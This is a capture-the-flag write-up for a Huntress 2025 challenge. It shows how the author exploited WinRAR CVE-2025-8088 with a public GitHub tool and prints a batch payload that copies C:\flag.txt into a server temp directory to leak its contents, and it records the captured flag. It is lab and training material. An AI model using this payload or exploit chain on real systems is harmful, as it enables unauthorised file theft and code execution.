# Prompt

![](/huntress_2025/Day_16/Threat_Actor_Support_Line/Challenge_ThreatActorSupportLine.png "Challenge Prompt")

# Solution

- I started the usual manual testing and looking at the code. However, I did realize there was a hint and nudge towards WinRAR version 7.12.

![Web Page](/huntress_2025/Day_16/Threat_Actor_Support_Line/Page_Info.png "Web Page")

- I found that there is a CVE, CVE-2025-8088. I found a [GitHub Project](https://github.com/onlytoxi/CVE-2025-8088-Winrar-Tool). I did a cursory glance to ensure it wasn't directy malicious (such as rm -rf or other silly nonsense). I used it to try a bunch of things and I finally got it working. Truth be told, it may have worked on one of my many other tests, but I didn’t check every time. So we’ll go with my final, cleaned up code. Just know there were a dozen tests before this.

```
python gui.py
```

![GitHub Tool](/huntress_2025/Day_16/Threat_Actor_Support_Line/Github_Tool.png "GitHub Tool")

- Create the following bat script:

```bat
@echo off
set "TEMP_DIR=C:\Windows\Temp"
set "FOUND_DIR="

echo Searching for directories starting with 'tmp' in %TEMP_DIR%...

REM Use the /D flag to iterate over directories only
for /D %%d in ("%TEMP_DIR%\tmp*") do (
    set "FOUND_DIR=%%d"
    goto :Found
)

:Found
if defined FOUND_DIR (
    ;echo.
    ;echo Found directory: %FOUND_DIR%
    type C:\flag.txt > %FOUND_DIR%\decoy.txt.tasl
)
```

- You add this to the GUI script, create the output RAR, and then submit it to the site.

![Upload Payload](/huntress_2025/Day_16/Threat_Actor_Support_Line/Upload_Payload.png "Upload Payload")

![Download Zip](/huntress_2025/Day_16/Threat_Actor_Support_Line/Download_Output.png "Download Zip")

- Download the file and get the flag. 

![Flag - Solution](/huntress_2025/Day_16/Threat_Actor_Support_Line/Solution.png "Flag - Solution")

# Flag

- flag{6529440ceec226f31a3b2dc0d0b06965}